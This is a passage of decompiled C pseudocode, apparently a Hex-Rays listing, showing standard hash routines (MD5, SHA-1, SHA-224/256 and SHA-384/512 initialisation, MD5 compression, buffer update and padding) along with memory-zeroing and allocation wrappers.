    a1[18] = sub_418600(*(_QWORD *)(a2 + 32), 0x28u);
    a1[19] = sub_418600(*(_QWORD *)(a2 + 32), 0x20u);
    a1[20] = HIBYTE(*(_DWORD *)(a2 + 32));
    a1[21] = BYTE2(*(_DWORD *)(a2 + 32));
    a1[22] = BYTE1(*(_QWORD *)(a2 + 32));
    a1[23] = *(_BYTE *)(a2 + 32);
    a1[24] = *(_BYTE *)(a2 + 47);
    a1[25] = *(_BYTE *)(a2 + 46);
    a1[26] = sub_418600(*(_QWORD *)(a2 + 40), 0x28u);
    a1[27] = sub_418600(*(_QWORD *)(a2 + 40), 0x20u);
    a1[28] = HIBYTE(*(_DWORD *)(a2 + 40));
    a1[29] = BYTE2(*(_DWORD *)(a2 + 40));
    a1[30] = BYTE1(*(_QWORD *)(a2 + 40));
    a1[31] = *(_BYTE *)(a2 + 40);
    a1[32] = *(_BYTE *)(a2 + 55);
    a1[33] = *(_BYTE *)(a2 + 54);
    a1[34] = sub_418600(*(_QWORD *)(a2 + 48), 0x28u);
    a1[35] = sub_418600(*(_QWORD *)(a2 + 48), 0x20u);
    a1[36] = HIBYTE(*(_DWORD *)(a2 + 48));
    a1[37] = BYTE2(*(_DWORD *)(a2 + 48));
    a1[38] = BYTE1(*(_QWORD *)(a2 + 48));
    a1[39] = *(_BYTE *)(a2 + 48);
    a1[40] = *(_BYTE *)(a2 + 63);
    a1[41] = *(_BYTE *)(a2 + 62);
    a1[42] = sub_418600(*(_QWORD *)(a2 + 56), 0x28u);
    a1[43] = sub_418600(*(_QWORD *)(a2 + 56), 0x20u);
    a1[44] = HIBYTE(*(_DWORD *)(a2 + 56));
    a1[45] = BYTE2(*(_DWORD *)(a2 + 56));
    a1[46] = BYTE1(*(_QWORD *)(a2 + 56));
    a1[47] = *(_BYTE *)(a2 + 56);
    if ( !*(_DWORD *)(a2 + 208) )
    {
      a1[48] = *(_BYTE *)(a2 + 71);
      a1[49] = *(_BYTE *)(a2 + 70);
      a1[50] = sub_418600(*(_QWORD *)(a2 + 64), 0x28u);
      a1[51] = sub_418600(*(_QWORD *)(a2 + 64), 0x20u);
      a1[52] = HIBYTE(*(_DWORD *)(a2 + 64));
      a1[53] = BYTE2(*(_DWORD *)(a2 + 64));
      a1[54] = BYTE1(*(_QWORD *)(a2 + 64));
      a1[55] = *(_BYTE *)(a2 + 64);
      a1[56] = *(_BYTE *)(a2 + 79);
      a1[57] = *(_BYTE *)(a2 + 78);
      a1[58] = sub_418600(*(_QWORD *)(a2 + 72), 0x28u);
      a1[59] = sub_418600(*(_QWORD *)(a2 + 72), 0x20u);
      a1[60] = HIBYTE(*(_DWORD *)(a2 + 72));
      a1[61] = BYTE2(*(_DWORD *)(a2 + 72));
      a1[62] = BYTE1(*(_QWORD *)(a2 + 72));
      a1[63] = *(_BYTE *)(a2 + 72);
    }
    return 0;
  }
  return result;
}

//----- (0040C4D0) --------------------------------------------------------
int __usercall sub_40C4D0@<eax>(_BYTE *a1@<edi>, const __m128i *a2, unsigned int a3, int a4)
{
  int v4; // esi
  _DWORD v6[54]; // [esp+8h] [ebp-D8h] BYREF

  sub_413EB0((int)v6, 0, 0xD8u);
  v4 = sub_40AF00(v6, a4);
  if ( !v4 )
  {
    v4 = sub_40BF50((int)v6, a2, a3);
    if ( !v4 )
      v4 = sub_40C010(a1, (int)v6);
  }
  sub_413EB0((int)v6, 0, 0xD8u);
  return v4;
}
// 40C4D0: using guessed type _DWORD var_D8[54];

//----- (0040C550) --------------------------------------------------------
int __cdecl sub_40C550(_DWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 1732584193;
  a1[3] = -271733879;
  a1[4] = -1732584194;
  a1[5] = 271733878;
  return 0;
}

//----- (0040C590) --------------------------------------------------------
int __cdecl sub_40C590(int a1, __m128i *a2, int a3)
{
  return sub_40D7D0(a3, a1, a2);
}

//----- (0040C5B0) --------------------------------------------------------
int __cdecl sub_40C5B0(int a1, _BYTE *a2)
{
  return sub_40D870(a2, a1);
}

//----- (0040C5D0) --------------------------------------------------------
int sub_40C5D0()
{
  int result; // eax
  int v1; // esi

  result = off_423FA0(1, 88);
  v1 = result;
  if ( result )
  {
    sub_413EB0(result, 0, 0x58u);
    return v1;
  }
  return result;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);

//----- (0040C600) --------------------------------------------------------
int __cdecl sub_40C600(LPVOID lpMem)
{
  if ( lpMem )
    sub_413EB0((int)lpMem, 0, 0x58u);
  return off_423FA4(lpMem);
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (0040C630) --------------------------------------------------------
void __cdecl sub_40C630(void *a1, const void *a2)
{
  qmemcpy(a1, a2, 0x58u);
}

//----- (0040C650) --------------------------------------------------------
int __cdecl sub_40C650(_DWORD *a1, unsigned __int8 *a2)
{
  return sub_40CDE0(a2, a1);
}

//----- (0040C670) --------------------------------------------------------
int __cdecl sub_40C670(int a1, __m128i *a2, unsigned int a3)
{
  int result; // eax

  result = a3;
  if ( a3 )
    return sub_410280(a1, a2, a3);
  return result;
}

//----- (0040C690) --------------------------------------------------------
int __cdecl sub_40C690(int a1, _BYTE *a2)
{
  return sub_410320(a1, a2);
}

//----- (0040C6B0) --------------------------------------------------------
int sub_40C6B0()
{
  int result; // eax
  int v1; // esi

  result = off_423FA0(1, 92);
  v1 = result;
  if ( result )
  {
    sub_413EB0(result, 0, 0x5Cu);
    return v1;
  }
  return result;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);

//----- (0040C6E0) --------------------------------------------------------
int __cdecl sub_40C6E0(_DWORD *a1, unsigned __int8 *a2)
{
  return sub_40E6B0(a2, a1);
}

//----- (0040C700) --------------------------------------------------------
int __cdecl sub_40C700(_DWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 1732584193;
  a1[3] = -271733879;
  a1[4] = -1732584194;
  a1[5] = 271733878;
  a1[6] = -1009589776;
  return 0;
}

//----- (0040C740) --------------------------------------------------------
int __cdecl sub_40C740(int a1, __m128i *a2, int a3)
{
  return sub_40ABF0(a3, a1, a2);
}

//----- (0040C760) --------------------------------------------------------
int __cdecl sub_40C760(int *a1, _BYTE *a2)
{
  return sub_40AC90(a2, a1);
}

//----- (0040C780) --------------------------------------------------------
void __cdecl sub_40C780(void *a1, const void *a2)
{
  qmemcpy(a1, a2, 0x5Cu);
}

//----- (0040C7A0) --------------------------------------------------------
int __cdecl sub_40C7A0(LPVOID lpMem)
{
  if ( lpMem )
    sub_413EB0((int)lpMem, 0, 0x5Cu);
  return off_423FA4(lpMem);
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (0040C7D0) --------------------------------------------------------
int __cdecl sub_40C7D0(_DWORD *a1, unsigned __int8 *a2)
{
  return sub_409990(a2, a1);
}

//----- (0040C7F0) --------------------------------------------------------
int __cdecl sub_40C7F0(_DWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  a1[2] = -1056596264;
  a1[3] = 914150663;
  a1[4] = 812702999;
  a1[5] = -150054599;
  a1[6] = -4191439;
  a1[7] = 1750603025;
  a1[8] = 1694076839;
  a1[9] = -1090891868;
  a1[26] = 1;
  return 0;
}

//----- (0040C850) --------------------------------------------------------
int __cdecl sub_40C850(unsigned int *a1, const __m128i *a2, int a3)
{
  return sub_40E460(a3, a1, a2);
}

//----- (0040C870) --------------------------------------------------------
int __cdecl sub_40C870(int *a1, _BYTE *a2)
{
  return sub_40E500(a2, a1);
}

//----- (0040C890) --------------------------------------------------------
int __cdecl sub_40C890(const __m128i *a1, int a2, _BYTE *a3)
{
  int v3; // esi
  int v5[27]; // [esp+Ch] [ebp-6Ch] BYREF

  sub_413EB0((int)v5, 0, 0x6Cu);
  v5[0] = 0;
  v5[1] = 0;
  v5[2] = -1056596264;
  v5[3] = 914150663;
  v5[4] = 812702999;
  v5[5] = -150054599;
  v5[6] = -4191439;
  v5[7] = 1750603025;
  v5[8] = 1694076839;
  v5[9] = -1090891868;
  v5[26] = 1;
  v3 = sub_40E460(a2, (unsigned int *)v5, a1);
  if ( !v3 )
    v3 = sub_40E500(a3, v5);
  sub_413EB0((int)v5, 0, 0x6Cu);
  return v3;
}

//----- (0040C930) --------------------------------------------------------
int sub_40C930()
{
  int result; // eax
  int v1; // esi

  result = off_423FA0(1, 108);
  v1 = result;
  if ( result )
  {
    sub_413EB0(result, 0, 0x6Cu);
    return v1;
  }
  return result;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);

//----- (0040C960) --------------------------------------------------------
int __cdecl sub_40C960(LPVOID lpMem)
{
  if ( lpMem )
    sub_413EB0((int)lpMem, 0, 0x6Cu);
  return off_423FA4(lpMem);
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (0040C990) --------------------------------------------------------
void __cdecl sub_40C990(void *a1, const void *a2)
{
  qmemcpy(a1, a2, 0x6Cu);
}

//----- (0040C9B0) --------------------------------------------------------
int __cdecl sub_40C9B0(_DWORD *a1, int a2)
{
  return sub_40DA30(a2, a1);
}

//----- (0040C9D0) --------------------------------------------------------
int __cdecl sub_40C9D0(_DWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 1779033703;
  a1[3] = -1150833019;
  a1[4] = 1013904242;
  a1[5] = -1521486534;
  a1[6] = 1359893119;
  a1[7] = -1694144372;
  a1[8] = 528734635;
  a1[9] = 1541459225;
  a1[26] = 0;
  return 0;
}

//----- (0040CA20) --------------------------------------------------------
int __cdecl sub_40CA20(const __m128i *a1, int a2, _BYTE *a3)
{
  int v3; // esi
  int v5[27]; // [esp+Ch] [ebp-6Ch] BYREF

  sub_413EB0((int)v5, 0, 0x6Cu);
  v5[0] = 0;
  v5[1] = 0;
  v5[2] = 1779033703;
  v5[3] = -1150833019;
  v5[4] = 1013904242;
  v5[5] = -1521486534;
  v5[6] = 1359893119;
  v5[7] = -1694144372;
  v5[8] = 528734635;
  v5[9] = 1541459225;
  v5[26] = 0;
  v3 = sub_40E460(a2, (unsigned int *)v5, a1);
  if ( !v3 )
    v3 = sub_40E500(a3, v5);
  sub_413EB0((int)v5, 0, 0x6Cu);
  return v3;
}

//----- (0040CAC0) --------------------------------------------------------
int __cdecl sub_40CAC0(_DWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = -1056596264;
  a1[5] = -876896931;
  a1[6] = 914150663;
  a1[7] = 1654270250;
  a1[8] = 812702999;
  a1[9] = -1856437926;
  a1[10] = -150054599;
  a1[11] = 355462360;
  a1[12] = -4191439;
  a1[13] = 1731405415;
  a1[14] = 1750603025;
  a1[15] = -1900787065;
  a1[16] = 1694076839;
  a1[17] = -619958771;
  a1[18] = -1090891868;
  a1[19] = 1203062813;
  a1[52] = 1;
  return 0;
}

//----- (0040CB60) --------------------------------------------------------
int __cdecl sub_40CB60(int a1, const __m128i *a2, unsigned int a3)
{
  return sub_40BF50(a1, a2, a3);
}

//----- (0040CB80) --------------------------------------------------------
int __cdecl sub_40CB80(int a1, _BYTE *a2)
{
  return sub_40C010(a2, a1);
}

//----- (0040CBA0) --------------------------------------------------------
int __cdecl sub_40CBA0(const __m128i *a1, unsigned int a2, _BYTE *a3)
{
  int v3; // esi
  int v5[54]; // [esp+10h] [ebp-D8h] BYREF

  sub_413EB0((int)v5, 0, 0xD8u);
  memset(v5, 0, 16);
  v5[4] = -1056596264;
  v5[5] = -876896931;
  v5[6] = 914150663;
  v5[7] = 1654270250;
  v5[8] = 812702999;
  v5[9] = -1856437926;
  v5[10] = -150054599;
  v5[11] = 355462360;
  v5[12] = -4191439;
  v5[13] = 1731405415;
  v5[14] = 1750603025;
  v5[15] = -1900787065;
  v5[16] = 1694076839;
  v5[17] = -619958771;
  v5[18] = -1090891868;
  v5[19] = 1203062813;
  v5[52] = 1;
  v3 = sub_40BF50((int)v5, a1, a2);
  if ( !v3 )
    v3 = sub_40C010(a3, (int)v5);
  sub_413EB0((int)v5, 0, 0xD8u);
  return v3;
}

//----- (0040CCB0) --------------------------------------------------------
int sub_40CCB0()
{
  int result; // eax
  int v1; // esi

  result = off_423FA0(1, 216);
  v1 = result;
  if ( result )
  {
    sub_413EB0(result, 0, 0xD8u);
    return v1;
  }
  return result;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);

//----- (0040CCE0) --------------------------------------------------------
int __cdecl sub_40CCE0(LPVOID lpMem)
{
  if ( lpMem )
    sub_413EB0((int)lpMem, 0, 0xD8u);
  return off_423FA4(lpMem);
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (0040CD10) --------------------------------------------------------
void __cdecl sub_40CD10(void *a1, const void *a2)
{
  qmemcpy(a1, a2, 0xD8u);
}

//----- (0040CD30) --------------------------------------------------------
int __cdecl sub_40CD30(int a1, int a2)
{
  return sub_40B000(a2, a1);
}

//----- (0040CD50) --------------------------------------------------------
int __cdecl sub_40CD50(_DWORD *a1)
{
  return sub_40AF00(a1, 0);
}

//----- (0040CD60) --------------------------------------------------------
int __cdecl sub_40CD60(const __m128i *a1, unsigned int a2, _BYTE *a3)
{
  int v3; // esi
  _DWORD v5[54]; // [esp+8h] [ebp-D8h] BYREF

  sub_413EB0((int)v5, 0, 0xD8u);
  v3 = sub_40AF00(v5, 0);
  if ( !v3 )
  {
    v3 = sub_40BF50((int)v5, a1, a2);
    if ( !v3 )
      v3 = sub_40C010(a3, (int)v5);
  }
  sub_413EB0((int)v5, 0, 0xD8u);
  return v3;
}
// 40CD60: using guessed type _DWORD var_D8[54];

//----- (0040CDE0) --------------------------------------------------------
int __usercall sub_40CDE0@<eax>(unsigned __int8 *a1@<eax>, _DWORD *a2)
{
  int v2; // ecx
  int v3; // edx
  int v4; // esi
  int v5; // edi
  int v6; // eax
  int v7; // ebx
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int v32; // eax
  int v33; // eax
  int v34; // eax
  int v35; // eax
  int v36; // eax
  int v37; // eax
  int v38; // ebx
  int v39; // eax
  int v40; // eax
  int v41; // eax
  int v42; // ebx
  int v43; // eax
  int v44; // eax
  int v45; // eax
  int v46; // ebx
  int v47; // eax
  int v48; // eax
  int v49; // eax
  int v50; // ebx
  int v51; // eax
  int v52; // eax
  int v53; // eax
  int v54; // eax
  int v55; // ecx
  int v56; // eax
  int v57; // eax
  int v58; // eax
  int v59; // ecx
  int v60; // ecx
  int v61; // edx
  int v62; // eax
  int v63; // edi
  int v64; // ecx
  int v65; // edx
  int v66; // eax
  int v67; // edi
  int v68; // ebx
  int v69; // esi
  int v70; // eax
  int v72; // [esp+18h] [ebp-48h]
  int v73; // [esp+1Ch] [ebp-44h]
  int v74; // [esp+20h] [ebp-40h]
  int v75; // [esp+24h] [ebp-3Ch]
  int v76; // [esp+28h] [ebp-38h]
  int v77; // [esp+2Ch] [ebp-34h]
  int v78; // [esp+30h] [ebp-30h]
  int v79; // [esp+34h] [ebp-2Ch]
  int v80; // [esp+38h] [ebp-28h]
  int v81; // [esp+3Ch] [ebp-24h]
  int v82; // [esp+40h] [ebp-20h]
  int v83; // [esp+44h] [ebp-1Ch]
  int v84; // [esp+50h] [ebp-10h]
  int v85; // [esp+50h] [ebp-10h]
  int v86; // [esp+50h] [ebp-10h]
  int v87; // [esp+50h] [ebp-10h]
  int v88; // [esp+50h] [ebp-10h]
  int v89; // [esp+50h] [ebp-10h]
  int v90; // [esp+50h] [ebp-10h]
  int v91; // [esp+50h] [ebp-10h]
  int v92; // [esp+50h] [ebp-10h]
  int v93; // [esp+50h] [ebp-10h]
  int v94; // [esp+50h] [ebp-10h]
  int v95; // [esp+50h] [ebp-10h]
  int v96; // [esp+54h] [ebp-Ch]
  int v97; // [esp+54h] [ebp-Ch]
  int v98; // [esp+54h] [ebp-Ch]
  int v99; // [esp+54h] [ebp-Ch]
  int v100; // [esp+54h] [ebp-Ch]
  int v101; // [esp+54h] [ebp-Ch]
  int v102; // [esp+54h] [ebp-Ch]
  int v103; // [esp+54h] [ebp-Ch]
  int v104; // [esp+54h] [ebp-Ch]
  int v105; // [esp+54h] [ebp-Ch]
  int v106; // [esp+54h] [ebp-Ch]
  int v107; // [esp+54h] [ebp-Ch]
  int v108; // [esp+54h] [ebp-Ch]
  int v109; // [esp+54h] [ebp-Ch]
  int v110; // [esp+58h] [ebp-8h]
  int v111; // [esp+58h] [ebp-8h]
  int v112; // [esp+58h] [ebp-8h]
  int v113; // [esp+58h] [ebp-8h]
  int v114; // [esp+58h] [ebp-8h]
  int v115; // [esp+58h] [ebp-8h]
  int v116; // [esp+58h] [ebp-8h]
  int v117; // [esp+58h] [ebp-8h]
  int v118; // [esp+58h] [ebp-8h]
  int v119; // [esp+58h] [ebp-8h]
  int v120; // [esp+58h] [ebp-8h]
  int v121; // [esp+58h] [ebp-8h]
  int v122; // [esp+58h] [ebp-8h]
  int v123; // [esp+5Ch] [ebp-4h]
  int v124; // [esp+5Ch] [ebp-4h]
  int v125; // [esp+5Ch] [ebp-4h]
  int v126; // [esp+5Ch] [ebp-4h]
  int v127; // [esp+5Ch] [ebp-4h]
  int v128; // [esp+5Ch] [ebp-4h]
  int v129; // [esp+5Ch] [ebp-4h]
  int v130; // [esp+5Ch] [ebp-4h]
  int v131; // [esp+5Ch] [ebp-4h]
  int v132; // [esp+5Ch] [ebp-4h]
  int v133; // [esp+5Ch] [ebp-4h]
  int v134; // [esp+5Ch] [ebp-4h]

  v2 = *a1 | ((a1[1] | (*((unsigned __int16 *)a1 + 1) << 8)) << 8);
  v3 = a1[4] | ((a1[5] | (*((unsigned __int16 *)a1 + 3) << 8)) << 8);
  v4 = a1[8] | ((a1[9] | (*((unsigned __int16 *)a1 + 5) << 8)) << 8);
  v72 = a1[12] | ((a1[13] | (*((unsigned __int16 *)a1 + 7) << 8)) << 8);
  v73 = a1[16] | ((a1[17] | ((a1[18] | (a1[19] << 8)) << 8)) << 8);
  v74 = a1[20] | ((a1[21] | ((a1[22] | (a1[23] << 8)) << 8)) << 8);
  v75 = a1[24] | ((a1[25] | ((a1[26] | (a1[27] << 8)) << 8)) << 8);
  v76 = a1[28] | ((a1[29] | ((a1[30] | (a1[31] << 8)) << 8)) << 8);
  v77 = a1[32] | ((a1[33] | (*((unsigned __int16 *)a1 + 17) << 8)) << 8);
  v78 = a1[36] | ((a1[37] | (*((unsigned __int16 *)a1 + 19) << 8)) << 8);
  v79 = a1[40] | ((a1[41] | (*((unsigned __int16 *)a1 + 21) << 8)) << 8);
  v80 = a1[44] | ((a1[45] | ((a1[46] | (a1[47] << 8)) << 8)) << 8);
  v81 = a1[48] | ((a1[49] | ((a1[50] | (a1[51] << 8)) << 8)) << 8);
  v82 = a1[52] | ((a1[53] | ((a1[54] | (a1[55] << 8)) << 8)) << 8);
  v83 = a1[56] | ((a1[57] | ((a1[58] | (a1[59] << 8)) << 8)) << 8);
  v5 = a1[60] | ((a1[61] | ((a1[62] | (a1[63] << 8)) << 8)) << 8);
  v6 = __ROL4__(a2[2] + (a2[5] ^ a2[3] & (a2[4] ^ a2[5])) + v2 - 680876936, 7);
  v7 = a2[3];
  v123 = v7 + v6;
  v8 = __ROL4__(a2[5] + (a2[4] ^ (v7 + v6) & (v7 ^ a2[4])) + v3 - 389564586, 12);
  v96 = v123 + v8;
  v9 = __ROR4__(a2[4] + (v7 ^ (v123 + v8) & (v123 ^ v7)) + v4 + 606105819, 15);
  v110 = v96 + v9;
  v10 = __ROR4__(v7 + (v123 ^ (v96 + v9) & (v123 ^ v96)) + v72 - 1044525330, 10);
  v84 = v110 + v10;
  v11 = __ROL4__(v123 + (v96 ^ (v110 + v10) & (v110 ^ v96)) + v73 - 176418897, 7);
  v124 = v84 + v11;
  v12 = __ROL4__(v96 + (v110 ^ (v84 + v11) & (v84 ^ v110)) + v74 + 1200080426, 12);
  v97 = v124 + v12;
  v13 = __ROR4__(v110 + (v84 ^ (v124 + v12) & (v124 ^ v84)) + v75 - 1473231341, 15);
  v111 = v97 + v13;
  v14 = __ROR4__(v84 + (v124 ^ (v97 + v13) & (v124 ^ v97)) + v76 - 45705983, 10);
  v85 = v111 + v14;
  v15 = __ROL4__(v124 + (v97 ^ (v111 + v14) & (v111 ^ v97)) + v77 + 1770035416, 7);
  v125 = v85 + v15;
  v16 = __ROL4__(v97 + (v111 ^ (v85 + v15) & (v85 ^ v111)) + v78 - 1958414417, 12);
  v98 = v125 + v16;
  v17 = __ROR4__(v111 + (v85 ^ (v125 + v16) & (v125 ^ v85)) + v79 - 42063, 15);
  v112 = v98 + v17;
  v18 = __ROR4__(v85 + (v125 ^ (v98 + v17) & (v125 ^ v98)) + v80 - 1990404162, 10);
  v86 = v112 + v18;
  v19 = __ROL4__(v125 + (v98 ^ (v112 + v18) & (v112 ^ v98)) + v81 + 1804603682, 7);
  v126 = v86 + v19;
  v20 = __ROL4__(v98 + (v112 ^ (v86 + v19) & (v86 ^ v112)) + v82 - 40341101, 12);
  v99 = v126 + v20;
  v21 = __ROR4__(v112 + (v86 ^ (v126 + v20) & (v126 ^ v86)) + v83 - 1502002290, 15);
  v113 = v99 + v21;
  v22 = __ROR4__(v86 + (v126 ^ (v99 + v21) & (v126 ^ v99)) + v5 + 1236535329, 10);
  v87 = v113 + v22;
  v23 = __ROL4__(v126 + (v113 ^ v99 & ((v113 + v22) ^ v113)) + v3 - 165796510, 5);
  v127 = v87 + v23;
  v24 = __ROL4__(v99 + (v87 ^ v113 & ((v87 + v23) ^ v87)) + v75 - 1069501632, 9);
  v100 = v127 + v24;
  v25 = __ROL4__(v113 + (v127 ^ v87 & (v127 ^ (v127 + v24))) + v80 + 643717713, 14);
  v114 = v100 + v25;
  v26 = __ROR4__(v87 + (v100 ^ v127 & ((v100 + v25) ^ v100)) + v2 - 373897302, 12);
  v88 = v114 + v26;
  v27 = __ROL4__(v127 + (v114 ^ v100 & ((v114 + v26) ^ v114)) + v74 - 701558691, 5);
  v128 = v88 + v27;
  v28 = __ROL4__(v100 + (v88 ^ v114 & ((v88 + v27) ^ v88)) + v79 + 38016083, 9);
  v101 = v128 + v28;
  v29 = __ROL4__(v114 + (v128 ^ v88 & (v128 ^ (v128 + v28))) + v5 - 660478335, 14);
  v115 = v101 + v29;
  v30 = __ROR4__(v88 + (v101 ^ v128 & ((v101 + v29) ^ v101)) + v73 - 405537848, 12);
  v89 = v115 + v30;
  v31 = __ROL4__(v128 + (v115 ^ v101 & ((v115 + v30) ^ v115)) + v78 + 568446438, 5);
  v129 = v89 + v31;
  v32 = __ROL4__(v101 + (v89 ^ v115 & ((v89 + v31) ^ v89)) + v83 - 1019803690, 9);
  v102 = v129 + v32;
  v33 = __ROL4__(v115 + (v129 ^ v89 & (v129 ^ (v129 + v32))) + v72 - 187363961, 14);
  v116 = v102 + v33;
  v34 = __ROR4__(v89 + (v102 ^ v129 & ((v102 + v33) ^ v102)) + v77 + 1163531501, 12);
  v90 = v116 + v34;
  v35 = __ROL4__(v129 + (v116 ^ v102 & ((v116 + v34) ^ v116)) + v82 - 1444681467, 5);
  v130 = v90 + v35;
  v36 = __ROL4__(v102 + (v90 ^ v116 & ((v90 + v35) ^ v90)) + v4 - 51403784, 9);
  v103 = v130 + v36;
  v37 = __ROL4__(v116 + (v130 ^ v90 & (v130 ^ (v130 + v36))) + v76 + 1735328473, 14);
  v117 = v103 + v37;
  v38 = __ROR4__(v90 + (v103 ^ v130 & ((v103 + v37) ^ v103)) + v81 - 1926607734, 12);
  v91 = v103 + v37 + v38;
  v39 = __ROL4__(v130 + ((v117 + v38) ^ v117 ^ v103) + v74 - 378558, 4);
  v131 = v91 + v39;
  v40 = __ROL4__(v103 + ((v91 + v39) ^ v91 ^ v117) + v77 - 2022574463, 11);
  v104 = v131 + v40;
  v41 = __ROL4__(v117 + (v131 ^ v91 ^ (v131 + v40)) + v80 + 1839030562, 16);
  v118 = v104 + v41;
  v42 = __ROR4__(v91 + (v131 ^ (v104 + v41) ^ v104) + v83 - 35309556, 9);
  v92 = v104 + v41 + v42;
  v43 = __ROL4__(v131 + ((v118 + v42) ^ v118 ^ v104) + v3 - 1530992060, 4);
  v132 = v92 + v43;
  v44 = __ROL4__(v104 + ((v92 + v43) ^ v92 ^ v118) + v73 + 1272893353, 11);
  v105 = v132 + v44;
  v45 = __ROL4__(v118 + (v132 ^ v92 ^ (v132 + v44)) + v76 - 155497632, 16);
  v119 = v105 + v45;
  v46 = __ROR4__(v92 + (v132 ^ (v105 + v45) ^ v105) + v79 - 1094730640, 9);
  v93 = v105 + v45 + v46;
  v47 = __ROL4__(v132 + ((v119 + v46) ^ v119 ^ v105) + v82 + 681279174, 4);
  v133 = v93 + v47;
  v48 = __ROL4__(v105 + ((v93 + v47) ^ v93 ^ v119) + v2 - 358537222, 11);
  v106 = v133 + v48;
  v49 = __ROL4__(v119 + (v133 ^ v93 ^ (v133 + v48)) + v72 - 722521979, 16);
  v120 = v106 + v49;
  v50 = v106 + v49 + __ROR4__(v93 + (v133 ^ (v106 + v49) ^ v106) + v75 + 76029189, 9);
  v51 = __ROL4__(v133 + (v50 ^ (v106 + v49) ^ v106) + v78 - 640364487, 4);
  v134 = v50 + v51;
  v52 = __ROL4__(v106 + ((v50 + v51) ^ v50 ^ v120) + v81 - 421815835, 11);
  v107 = v134 + v52;
  v53 = __ROL4__(v120 + (v134 ^ v50 ^ (v134 + v52)) + v5 + 530742520, 16);
  v121 = v107 + v53;
  v54 = __ROR4__(v50 + (v134 ^ (v107 + v53) ^ v107) + v4 - 995338651, 9);
  v94 = v121 + v54;
  v55 = v121 + v54 + __ROL4__(v134 + (v121 ^ ((v121 + v54) | ~v107)) + v2 - 198630844, 6);
  v56 = __ROL4__(v107 + ((v121 + v54) ^ (v55 | ~v121)) + v76 + 1126891415, 10);
  v108 = v55 + v56;
  v57 = __ROL4__(v121 + (v55 ^ ((v55 + v56) | ~v94)) + v83 - 1416354905, 15);
  v122 = v108 + v57;
  v95 = v108 + v57 + __ROR4__(v94 + (v108 ^ ((v108 + v57) | ~v55)) + v74 - 57434055, 11);
  v58 = v95 + __ROL4__(v55 + ((v108 + v57) ^ (v95 | ~v108)) + v81 + 1700485571, 6);
  v59 = __ROL4__(v108 + (v95 ^ (v58 | ~v122)) + v72 - 1894986606, 10);
  v109 = v58 + v59;
  v60 = __ROL4__(v122 + (v58 ^ ((v58 + v59) | ~v95)) + v79 - 1051523, 15);
  v61 = v109 + v60 + __ROR4__(v95 + (v109 ^ ((v109 + v60) | ~v58)) + v3 - 2054922799, 11);
  v62 = v61 + __ROL4__(v58 + ((v109 + v60) ^ (v61 | ~v109)) + v77 + 1873313359, 6);
  v63 = v62 + __ROL4__(v109 + (v61 ^ (v62 | ~(v109 + v60))) + v5 - 30611744, 10);
  v64 = v63 + __ROL4__(v109 + v60 + (v62 ^ (v63 | ~v61)) + v75 - 1560198380, 15);
  v65 = v64 + __ROR4__(v61 + (v63 ^ (v64 | ~v62)) + v82 + 1309151649, 11);
  v66 = v65 + __ROL4__(v62 + (v64 ^ (v65 | ~v63)) + v73 - 145523070, 6);
  v67 = v66 + __ROL4__(v63 + (v65 ^ (v66 | ~v64)) + v80 - 1120210379, 10);
  v68 = v66 + a2[2];
  v69 = v67 + __ROL4__(v64 + (v66 ^ (v67 | ~v65)) + v4 + 718787259, 15);
  v70 = a2[3] + __ROR4__(v65 + (v67 ^ (v69 | ~v66)) + v78 - 343485551, 11);
  a2[2] = v68;
  a2[3] = v69 + v70;
  a2[4] += v69;
  a2[5] += v67;
  return 0;
}

//----- (0040D7D0) --------------------------------------------------------
int __usercall sub_40D7D0@<eax>(int result@<eax>, int a2@<ebx>, __m128i *a3)
{
  unsigned int v3; // edi
  unsigned int v4; // ecx
  unsigned int v5; // esi
  int v6; // [esp+4h] [ebp-4h]

  v3 = result;
  if ( result )
  {
    result = *(_DWORD *)a2 & 0x3F;
    v4 = v3 + *(_DWORD *)a2;
    v5 = 64 - result;
    v6 = result;
    *(_DWORD *)a2 = v4;
    if ( v4 < v3 )
      ++*(_DWORD *)(a2 + 4);
    if ( result && v3 >= v5 )
    {
      sub_415930(result + a2 + 24, a3, 64 - result);
      result = sub_40CDE0((unsigned __int8 *)(a2 + 24), (_DWORD *)a2);
      if ( result )
        return result;
      a3 = (__m128i *)((char *)a3 + v5);
      v3 -= v5;
      v6 = 0;
    }
    if ( v3 < 0x40 )
    {
LABEL_12:
      if ( v3 )
        sub_415930(result + a2 + 24, a3, v3);
      return 0;
    }
    else
    {
      while ( 1 )
      {
        result = sub_40CDE0((unsigned __int8 *)a3, (_DWORD *)a2);
        if ( result )
          break;
        a3 += 4;
        v3 -= 64;
        if ( v3 < 0x40 )
        {
          result = v6;
          goto LABEL_12;
        }
      }
    }
  }
  return result;
}

//----- (0040D870) --------------------------------------------------------
int __usercall sub_40D870@<eax>(_BYTE *a1@<edi>, int a2@<esi>)
{
  int v2; // eax
  unsigned int v3; // eax
  int result; // eax
  int v5; // ecx
  int v6; // eax

  v2 = *(_DWORD *)a2 & 0x3F;
  *(_BYTE *)(v2 + a2 + 24) = 0x80;
  v3 = v2 + 1;
  if ( v3 > 0x38 )
  {
    sub_413EB0(v3 + a2 + 24, 0, 64 - v3);
